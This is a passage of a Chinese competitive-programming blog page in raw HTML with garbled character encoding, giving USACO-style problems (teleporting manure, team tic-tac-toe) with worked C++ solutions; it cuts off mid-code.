punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ä¸‹æ–¹æœªè¦†ç›–</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">&gt;</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> x<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">&lt;=</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> y<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">&gt;=</span>y<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> y<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">&lt;=</span>y<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        cout<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-</span>x<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>y<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-</span>y<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å³ä¾§æœªè¦†ç›–</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> x<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">&gt;=</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> y<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">&gt;=</span>y<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> y<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">&lt;=</span>y<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        cout<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">-</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>y<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-</span>y<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å·¦ä¾§æœªè¦†ç›–</span>    <span class="token keyword">else</span> cout<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>y<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-</span>y<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å®Œå…¨æœªè¦†ç›– ä»¥åŠåªè¦†ç›–è¾¹è§’</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ä¼ é€"><a href="#ä¼ é€" class="headerlink" title="ä¼ é€"></a>ä¼ é€</h2><p>Farmer John æœ€è®¨åŒçš„å†œæ´»æ˜¯è¿è¾“ç‰›ç²ªã€‚</p><p>ä¸ºäº†ç²¾ç®€è¿™ä¸ªè¿‡ç¨‹ï¼Œä»–åˆ¶é€ äº†ä¸€ä¸ªä¼Ÿå¤§çš„å‘æ˜ï¼šä¾¿ä¾¿ä¼ é€é—¨ï¼</p><p>ä¸ä½¿ç”¨æ‹–æ‹‰æœºæ‹–ç€è£…æ»¡ç‰›ç²ªçš„å¤§è½¦ä»ä¸€ä¸ªåœ°ç‚¹åˆ°å¦ä¸€ä¸ªåœ°ç‚¹ç›¸æ¯”ï¼Œä»–å¯ä»¥ä½¿ç”¨ä¾¿ä¾¿ä¼ é€é—¨å°†ç‰›ç²ªä»ä¸€ä¸ªåœ°ç‚¹ç¬é—´ä¼ é€åˆ°å¦ä¸€ä¸ªåœ°ç‚¹ã€‚</p><p>Farmer John çš„å†œåœºæ²¿ç€ä¸€æ¡é•¿ç›´é“è·¯è€Œå»ºï¼Œæ‰€ä»¥ä»–å†œåœºä¸Šçš„æ¯ä¸ªåœ°ç‚¹éƒ½å¯ä»¥ç®€å•åœ°ç”¨è¯¥åœ°ç‚¹åœ¨é“è·¯ä¸Šçš„ä½ç½®æ¥è¡¨ç¤ºï¼ˆç›¸å½“äºæ•°è½´ä¸Šçš„ä¸€ä¸ªç‚¹ï¼‰ã€‚</p><p>ä¸€ä¸ªä¼ é€é—¨å¯ä»¥ç”¨ä¸¤ä¸ªæ•° $x$ å’Œ $y$ è¡¨ç¤ºï¼Œè¢«æ‹–åˆ°åœ°ç‚¹ $x$ çš„ç‰›ç²ªå¯ä»¥ç¬é—´ä¼ é€åˆ°åœ°ç‚¹ $y$ï¼Œåä¹‹äº¦ç„¶ã€‚</p><p>Farmer John æƒ³è¦å°†ç‰›ç²ªä»åœ°ç‚¹ $a$ è¿è¾“åˆ°åœ°ç‚¹ $b$ï¼Œä»–å»ºé€ äº†ä¸€ä¸ªå¯èƒ½å¯¹è¿™ä¸€è¿‡ç¨‹æœ‰æ‰€å¸®åŠ©çš„ä¼ é€é—¨ï¼ˆå½“ç„¶ï¼Œå¦‚æœæ²¡æœ‰å¸®åŠ©ï¼Œä»–ä¹Ÿå¯ä»¥ä¸ç”¨ï¼‰ã€‚</p><p>è¯·å¸®åŠ©ä»–æ±‚å‡ºä»–éœ€è¦ä½¿ç”¨æ‹–æ‹‰æœºè¿è¾“ç‰›ç²ªçš„æ€»è·ç¦»çš„æœ€å°å€¼ã€‚</p><h4 id="è¾“å…¥æ ¼å¼-4"><a href="#è¾“å…¥æ ¼å¼-4" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h4><p>è¾“å…¥ä»…åŒ…å«ä¸€è¡Œï¼Œä¸ºå››ä¸ªç”¨ç©ºæ ¼åˆ†éš”çš„æ•´æ•°ï¼š$a$ å’Œ $b$ï¼Œè¡¨ç¤ºèµ·å§‹åœ°ç‚¹å’Œç»“æŸåœ°ç‚¹ï¼Œåé¢æ˜¯ $x$ å’Œ $y$ï¼Œè¡¨ç¤ºä¼ é€é—¨ã€‚</p><p>æ‰€æœ‰çš„ä½ç½®éƒ½æ˜¯èŒƒå›´ä¸º $0â€¦100$ çš„æ•´æ•°ï¼Œä¸ä¸€å®šå„ä¸ç›¸åŒã€‚</p><h4 id="è¾“å‡ºæ ¼å¼-4"><a href="#è¾“å‡ºæ ¼å¼-4" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h4><p>è¾“å‡ºä¸€ä¸ªæ•´æ•°ï¼Œä¸º Farmer John éœ€è¦ç”¨æ‹–æ‹‰æœºè¿è¾“ç‰›ç²ªçš„æœ€å°è·ç¦»ã€‚</p><h4 id="è¾“å…¥æ ·ä¾‹ï¼š-4"><a href="#è¾“å…¥æ ·ä¾‹ï¼š-4" class="headerlink" title="è¾“å…¥æ ·ä¾‹ï¼š"></a>è¾“å…¥æ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">3 10 8 2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹ï¼š-4"><a href="#è¾“å‡ºæ ·ä¾‹ï¼š-4" class="headerlink" title="è¾“å‡ºæ ·ä¾‹ï¼š"></a>è¾“å‡ºæ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æ ·ä¾‹è§£é‡Š-4"><a href="#æ ·ä¾‹è§£é‡Š-4" class="headerlink" title="æ ·ä¾‹è§£é‡Š"></a>æ ·ä¾‹è§£é‡Š</h4><p>åœ¨è¿™ä¸ªæ ·ä¾‹ä¸­ï¼Œæœ€ä½³ç­–ç•¥æ˜¯å°†ç‰›ç²ªä»ä½ç½® $3$ è¿åˆ°ä½ç½® $2$ï¼Œä¼ é€åˆ°ä½ç½® $8$ï¼Œå†è¿åˆ°ä½ç½® $10$ã€‚</p><p>æ‰€ä»¥éœ€è¦ç”¨æ‹–æ‹‰æœºçš„æ€»è·ç¦»ä¸º $1 + 2 = 3$ã€‚</p><h4 id="é¢˜è§£-4"><a href="#é¢˜è§£-4" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h4><p>è¿˜æ˜¯åˆ†ç±»è®¨è®º</p><p>èµ·ç‚¹ <code>a</code>, ç»ˆç‚¹ <code>b</code>ï¼Œä¼ é€é—¨ï¼š<code>c</code>, <code>d</code>.</p><p>æƒ…å†µä¸€ï¼šä¸ä½¿ç”¨ä¼ é€é—¨ï¼Œ<code>abs(b - a)</code></p><p><img src="/2022/04/02/mei-ri-yi-ti-san/55289_def1f956b0-1.PNG"></p><p>æƒ…å†µäºŒï¼š <code>a -&gt; c</code> ç„¶åé€šè¿‡<code>c</code>ä¼ é€åˆ°<code>d</code>, å†ä»<code>d-&gt;b</code>ã€‚æ€»è·ç¦»ä¸º<code>abs(a - c) + abs(b - d)</code>ã€‚</p><p><img src="/2022/04/02/mei-ri-yi-ti-san/55289_e25e04f6b0-2.PNG"></p><p>æƒ…å†µä¸‰ï¼š <code>a -&gt; d</code> ç„¶åé€šè¿‡<code>d</code>ä¼ é€åˆ°<code>c</code>, å†ä»<code>c-&gt;b</code>ã€‚æ€»è·ç¦»ä¸º<code>abs(a - d) + abs(b - c)</code>ã€‚</p><p><img src="/2022/04/02/mei-ri-yi-ti-san/55289_e5eb450eb0-3.PNG"></p><p>ä¸‰è€…å–æœ€å°</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    cin <span class="token operator">&gt;&gt;</span> a <span class="token operator">&gt;&gt;</span> b <span class="token operator">&gt;&gt;</span> c <span class="token operator">&gt;&gt;</span> d<span class="token punctuation">;</span>    <span class="token comment">//3 ç§æƒ…å†µå–æœ€å°å€¼å³å¯</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token function">min</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token function">abs</span><span class="token punctuation">(</span>b <span class="token operator">-</span> a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">abs</span><span class="token punctuation">(</span>a <span class="token operator">-</span> c<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">abs</span><span class="token punctuation">(</span>d <span class="token operator">-</span> b<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">abs</span><span class="token punctuation">(</span>a <span class="token operator">-</span> d<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">abs</span><span class="token punctuation">(</span>b <span class="token operator">-</span> c<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ç»„é˜Ÿäº•å­—æ¸¸æˆ"><a href="#ç»„é˜Ÿäº•å­—æ¸¸æˆ" class="headerlink" title="ç»„é˜Ÿäº•å­—æ¸¸æˆ"></a>ç»„é˜Ÿäº•å­—æ¸¸æˆ</h2><p>Farmer John æœ‰ $26$ å¤´å¥¶ç‰›ï¼Œæ°å¥½å¥¹ä»¬åå­—éƒ½ä»¥ä¸åŒçš„å­—æ¯å¼€å¤´ï¼Œæ‰€ä»¥ Farmer John ç”¨æ¯å¤´å¥¶ç‰›çš„åå­—çš„é¦–å­—æ¯æ¥æŒ‡ä»£å¥¹â€”â€”ä¸€ä¸ª $Aâ€¦Z$ ä¹‹é—´çš„å­—æ¯ã€‚</p><p>è¿™äº›å¥¶ç‰›æœ€è¿‘æ²‰è¿·äºäº•å­—æ¸¸æˆï¼Œä½†æ˜¯ç”±äºå¥¹ä»¬å¹¶ä¸æ»¡è¶³åªæœ‰ä¸¤å¤´å¥¶ç‰›å¯ä»¥ä¸€èµ·ç©ï¼Œå¥¹ä»¬æ”¹ç¼–äº†è¿™ä¸ªæ¸¸æˆï¼Œå¯ä»¥è®©è®¸å¤šå¥¶ç‰›å¯ä»¥ä¸€å—å„¿ç©ï¼</p><p>å°±åƒå¸¸è§„çš„äº•å­—æ¸¸æˆä¸€æ ·ï¼Œè¿™ä¸ªæ¸¸æˆæ˜¯åœ¨ä¸€å— $3Ã—3$ çš„æ£‹ç›˜ä¸Šè¿›è¡Œçš„ï¼Œåªæ˜¯ä¸ä»…ç”¨ $X$ å’Œ $O$ ä¸åŒï¼Œæ¯ä¸ªæ ¼å­ç”¨ä¸€ä¸ª $Aâ€¦Z$ ä¹‹é—´çš„å­—æ¯æ ‡è®°ï¼Œè¡¨ç¤ºå æœ‰è¿™ä¸ªæ ¼å­çš„å¥¶ç‰›åå­—çš„é¦–å­—æ¯ã€‚</p><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªæ£‹ç›˜çš„ä¾‹å­ï¼š</p><pre class="line-numbers language-none"><code class="language-none">COWXXOABC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿™äº›å¥¶ç‰›ä¼šåœ¨å¥¹ä»¬è¿·æƒ‘äºå¦‚ä½•åˆ¤æ–­èƒœè´Ÿä¹‹å‰å°±å æ»¡è¿™ä¹ä¸ªæ ¼å­ã€‚</p><p>æ˜¾ç„¶ï¼Œå°±åƒå¸¸è§„çš„äº•å­—æ¸¸æˆä¸€æ ·ï¼Œå¦‚æœä»»ä½•ä¸€å¤´å¥¶ç‰›å æœ‰äº†ä¸€æ•´è¡Œã€ä¸€æ•´åˆ—ï¼Œæˆ–æ˜¯ä¸€æ•´æ¡å¯¹è§’çº¿ï¼Œé‚£ä¹ˆè¿™å¤´å¥¶ç‰›å°±è·èƒœäº†ã€‚</p><p>ç„¶è€Œï¼Œç”±äºå¥¶ç‰›è®¤ä¸ºå¤šç‰›æ¸¸æˆä¸­è¿™å¹¶ä¸å®¹æ˜“å‡ºç°ï¼Œæ‰€ä»¥å¥¹ä»¬å†³å®šå…è®¸å¥¶ç‰›ç»„æˆä¸¤ç‰›ä¸€é˜Ÿï¼Œå¦‚æœæŸä¸€è¡Œã€ä¸€åˆ—ï¼Œæˆ–æ˜¯ä¸€æ¡å¯¹è§’çº¿ä»…åŒ…å«ä¸€é˜Ÿçš„ä¸¤å¤´å¥¶ç‰›çš„å­—æ¯ï¼Œå¹¶ä¸”åŒæ—¶åŒ…å«äº†è¿™ä¸¤å¤´å¥¶ç‰›ï¼ˆä¸ä»…ä»…æ˜¯ä¸€å¤´ï¼‰çš„å­—æ¯ï¼Œé‚£ä¹ˆè¿™ä¸€é˜Ÿå°±è·èƒœã€‚</p><p>è¯·å¸®åŠ©å¥¶ç‰›ä»¬åˆ¤æ–­æœ‰å¤šå°‘å¤´å¥¶ç‰›æˆ–æ˜¯ä¸¤å¤´å¥¶ç‰›ç»„æˆçš„é˜Ÿä¼å¯ä»¥è·èƒœã€‚</p><p>æ³¨æ„æ£‹ç›˜ä¸Šçš„åŒä¸€ä¸ªæ ¼å­å¯èƒ½åœ¨ä¸åŒå¥¶ç‰›æˆ–é˜Ÿä¼çš„è·èƒœä¸­å‡è¢«ç”¨åˆ°ã€‚</p><h4 id="è¾“å…¥æ ¼å¼-5"><a href="#è¾“å…¥æ ¼å¼-5" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h4><p>è¾“å…¥åŒ…å«ä¸‰è¡Œï¼Œæ¯è¡Œä¸‰ä¸ª $Aâ€¦Z$ ä¹‹é—´çš„å­—ç¬¦ã€‚</p><h4 id="è¾“å‡ºæ ¼å¼-5"><a href="#è¾“å‡ºæ ¼å¼-5" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h4><p>è¾“å‡ºåŒ…å«ä¸¤è¡Œã€‚</p><p>ç¬¬ä¸€è¡Œï¼Œè¾“å‡ºèƒ½å¤Ÿè·èƒœçš„å•ç‹¬çš„å¥¶ç‰›çš„æ•°é‡ã€‚</p><p>ç¬¬äºŒè¡Œï¼Œè¾“å‡ºèƒ½å¤Ÿè·èƒœçš„ä¸¤å¤´å¥¶ç‰›ç»„æˆçš„é˜Ÿä¼çš„æ•°é‡ã€‚</p><h4 id="è¾“å…¥æ ·ä¾‹ï¼š-5"><a href="#è¾“å…¥æ ·ä¾‹ï¼š-5" class="headerlink" title="è¾“å…¥æ ·ä¾‹ï¼š"></a>è¾“å…¥æ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">COWXXOABC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹ï¼š-5"><a href="#è¾“å‡ºæ ·ä¾‹ï¼š-5" class="headerlink" title="è¾“å‡ºæ ·ä¾‹ï¼š"></a>è¾“å‡ºæ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">02<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="æ ·ä¾‹è§£é‡Š-5"><a href="#æ ·ä¾‹è§£é‡Š-5" class="headerlink" title="æ ·ä¾‹è§£é‡Š"></a>æ ·ä¾‹è§£é‡Š</h4><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæ²¡æœ‰å•ç‹¬çš„å¥¶ç‰›å¯ä»¥è·å¾—èƒœåˆ©ã€‚</p><p>ä½†æ˜¯ï¼Œå¦‚æœå¥¶ç‰› $C$ å’Œå¥¶ç‰› $X$ ç»„é˜Ÿï¼Œå¥¹ä»¬å¯ä»¥é€šè¿‡ $C-X-C$ å¯¹è§’çº¿è·èƒœã€‚</p><p>åŒæ ·åœ°ï¼Œå¦‚æœå¥¶ç‰› $X$ å’Œ $O$ ç»„é˜Ÿï¼Œå¥¹ä»¬å¯ä»¥é€šè¿‡ä¸­é—´ä¸€è¡Œå–èƒœã€‚</p><h4 id="é¢˜è§£-5"><a href="#é¢˜è§£-5" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h4><p>å®˜æ–¹é¢˜è§£ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">char</span> B<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// Does 1 cow win?</span><span class="token keyword">int</span> <span class="token function">cow_wins</span><span class="token punctuation">(</span><span class="token keyword">char</span> ch<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment">// Check diagonals</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>B<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> ch <span class="token operator">&amp;&amp;</span> B<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> ch <span class="token operator">&amp;&amp;</span> B<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> ch<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>B<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> ch <span class="token operator">&amp;&amp;</span> B<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> ch <span class="token operator">&amp;&amp;</span> B<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> ch<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment">// Check rows and columns</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>B<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> ch <span class="token operator">&amp;&amp;</span> B<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> ch <span class="token operator">&amp;&amp;</span> B<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> ch<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> ch <span class="token operator">&amp;&amp;</span> B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> ch <span class="token operator">&amp;&amp;</span> B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> ch<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token comment">// Test if a team wins based on 3 characters in a row, column, or diagonal</span>bool <span class="token function">check3</span><span class="token punctuation">(</span><span class="token keyword">char</span> ch1<span class="token punctuation">,</span> <span class="token keyword">char</span> ch2<span class="token punctuation">,</span> <span class="token keyword">char</span> a<span class="token punctuation">,</span> <span class="token keyword">char</span> b<span class="token punctuation">,</span> <span class="token keyword">char</span> c<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// All 3 characters have to be either ch1 or ch2</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">!=</span> ch1 <span class="token operator">&amp;&amp;</span> a <span class="token operator">!=</span> ch2<span class="token punctuation">)</span> <span class="token keyword">return</span> false<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">!=</span> ch1 <span class="token operator">&amp;&amp;</span> b <span class="token operator">!=</span> ch2<span class="token punctuation">)</span> <span class="token keyword">return</span> false<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">!=</span> ch1 <span class="token operator">&amp;&amp;</span> c <span class="token operator">!=</span> ch2<span class="token punctuation">)</span> <span class="token keyword">return</span> false<span class="token punctuation">;</span>  <span class="token comment">// ch1 and ch2 have to appear at least once each</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">!=</span> ch1 <span class="token operator">&amp;&amp;</span> b <span class="token operator">!=</span> ch1 <span class="token operator">&amp;&amp;</span> c <span class="token operator">!=</span> ch1<span class="token punctuation">)</span> <span class="token keyword">return</span> false<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">!=</span> ch2 <span class="token operator">&amp;&amp;</span> b <span class="token operator">!=</span> ch2 <span class="token operator">&amp;&amp;</span> c <span class="token operator">!=</span> ch2<span class="token punctuation">)</span> <span class="token keyword">return</span> false<span class="token punctuation">;</span>  <span class="token keyword">return</span> true<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">// Does a team win?</span><span class="token keyword">int</span> <span class="token function">team_wins</span><span class="token punctuation">(</span><span class="token keyword">char</span> ch1<span class="token punctuation">,</span> <span class="token keyword">char</span> ch2<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment">// Check diagonals</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">check3</span><span class="token punctuation">(</span>ch1<span class="token punctuation">,</span> ch2<span class="token punctuation">,</span> B<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> B<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> B<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">check3</span><span class="token punctuation">(</span>ch1<span class="token punctuation">,</span> ch2<span class="token punctuation">,</span> B<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> B<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> B<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment">// Check rows and columns</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">check3</span><span class="token punctuation">(</span>ch1<span class="token punctuation">,</span> ch2<span class="token punctuation">,</span> B<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> B<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> B<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">check3</span><span class="token punctuation">(</span>ch1<span class="token punctuation">,</span> ch2<span class="token punctuation">,</span> B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span 